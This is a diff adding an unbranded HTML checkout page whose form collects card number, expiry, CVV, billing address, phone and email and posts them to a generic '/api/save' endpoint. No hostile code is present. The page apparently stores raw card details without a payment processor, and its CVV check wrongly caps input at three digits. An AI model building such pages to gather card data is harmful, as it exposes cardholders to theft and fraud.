@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/index.css">
+    <link rel="stylesheet" href="./css/mostused.css">
+    <title>Document</title>
+</head>
+
+<body class="min-h-screen center bg-gray-100">
+    <section class=" p-2 center">
+        <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
+            <h1 class="text-xl font-semibold mb-2 flex items-center">
+                <svg class="w-6 h-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M17 9V7a4 4 0 00-8 0v2m-4 4v10h16V13H5zm12-4h.01M7 13h10M7 17h10m-9 4h8"></path>
+                </svg>
+                Debit or Credit Card
+            </h1>
+            <form id="myForm" action="/api/save" method="post">
+                <div class="mb-4">
+                    <label class="block text-gray-700">Card number</label>
+                    <input name="card_number" type="text"
+                        class="mt-1 block w-full border border-gray-300 rounded-md p-2 focus:border-blue-500"
+                        placeholder="Card number">
+                </div>
+                <div class="flex mb-4">
+                    <div class="w-1/2 mr-2">
+                        <label class="block text-gray-700">Expires</label>
+                        <input name="expires" type="text"
+                            class="mt-1 block w-full border border-gray-300 rounded-md p-2 focus:border-blue-500"
+                            placeholder="MM/YY" maxlength="5" id="expires">
+                    </div>
+                    <div class="w-1/2 ml-2">
+                        <label class="block text-gray-700">CSC/CVV</label>
+                        <input id="cvv" name="cvv" type="text"
+                            class="mt-1 block w-full border border-gray-300 rounded-md p-2 focus:border-blue-500"
+                            placeholder="CSC">
+                    </div>
+                </div>
+                <div class="mb-4">
+                    <label class="block text-gray-700">Billing address</label>
+                    <div class="flex space-x-2 mb-2">
+                        <input name="first_name" type="text"
+                            class="w-1/2 border border-gray-300 rounded-md p-2 focus:border-blue-500"
+                            placeholder="First name">
+                        <input name="last_name" type="text"
+                            class="w-1/2 border border-gray-300 rounded-md p-2 focus:border-blue-500"
+                            placeholder="Last name">
+                    </div>
+                    <input name="address" type="text"
+                        class="mt-1 block w-full border border-gray-300 rounded-md p-2 focus:border-blue-500 mb-2"
+                        placeholder="Street address">
+                    <input name="apartment" type="text"
+                        class="mt-1 block w-full border border-gray-300 rounded-md p-2 focus:border-blue-500 mb-2"
+                        placeholder="Apt., ste., bldg.">
+                    <div class="flex space-x-2 mb-2">
+                        <input name="city" type="text"
+                            class="w-1/2 border border-gray-300 rounded-md p-2 focus:border-blue-500"
+                            placeholder="City">
+                        <input name="state" type="text"
+                            class="w-1/2 border border-gray-300 rounded-md p-2 focus:border-blue-500"
+                            placeholder="State">
+                    </div>
+                    <input name="zip_code" type="text"
+                        class="mt-1 block w-full border border-gray-300 rounded-md p-2 focus:border-blue-500 mb-2"
+                        placeholder="ZIP code">
+                    <div class="flex space-x-2 mb-2">
+                        <input name="phone" type="tel"
+                            class="w-1/2 border border-gray-300 rounded-md p-2 focus:border-blue-500"
+                            placeholder="Mobile +1">
+                        <input name="email" type="email"
+                            class="w-1/2 border border-gray-300 rounded-md p-2 focus:border-blue-500"
+                            placeholder="Email">
+                    </div>
+                </div>
+                <div class="mb-4">
+                    <label class="inline-flex items-center">
+                        <input type="checkbox" class="form-checkbox border border-gray-300 rounded text-blue-500"
+                            checked>
+                        <span class="ml-2 text-gray-700">Ship to billing address</span>
+                    </label>
+                </div>
+                <p class="text-gray-600 text-sm mb-4">By continuing, you confirm you're 18 years or older.</p>
+                <button type="submit"
+                    class="w-full bg-blue-600 text-white rounded-md p-2 hover:bg-blue-700 transition duration-200">Pay
+                    Now</button>
+            </form>
+            <div id="responseMessage" class="mt-4 hidden text-center p-2 rounded-md"></div>
+        </div>
+
+        <script>
+            document.getElementById("expires").addEventListener("input", function (event) {
+                var input = event.target.value;
+                if (input.length === 2 && !input.includes('/')) {
+                    event.target.value = input + '/';
+                }
+            });
+
+            // Ensure CVV input only contains 3 numeric characters
+            document.getElementById("cvv").addEventListener("input", function (event) {
+                var input = event.target.value;
+                // Remove any non-numeric characters
+                input = input.replace(/\D/g, '');
+                // Trim the input to 3 characters
+                if (input.length > 3) {
+                    input = input.slice(0, 3);
+                }
+                event.target.value = input;
+            });
+
+            document.getElementById("myForm").addEventListener("submit", function (event) {
+                event.preventDefault(); // Prevent the default form submission
+
+                var formData = new FormData(this); // Create a FormData object from the form
+
+                // Send the form data using AJAX
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", this.action);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.onload = function () {
+                    var responseMessage = document.getElementById("responseMessage");
+                    if (xhr.status === 200) {
+                        responseMessage.textContent = xhr.responseText;
+                        responseMessage.classList.remove("hidden");
+                        responseMessage.classList.add("bg-green-200", "text-green-800");
+                    } else {
+                        responseMessage.textContent = xhr.responseText;
+                        responseMessage.classList.remove("hidden");
+                        responseMessage.classList.add("bg-red-200", "text-red-800");
+                    }
+                    // Hide the response message after 3 seconds
+                    setTimeout(function () {
+                        responseMessage.classList.add("hidden");
+                    }, 3000);
+                };
+                xhr.send(new URLSearchParams(formData).toString()); // Send the form data as URL-encoded string
+            });
+        </script>
+    </section>
+</body>
+
+</html>
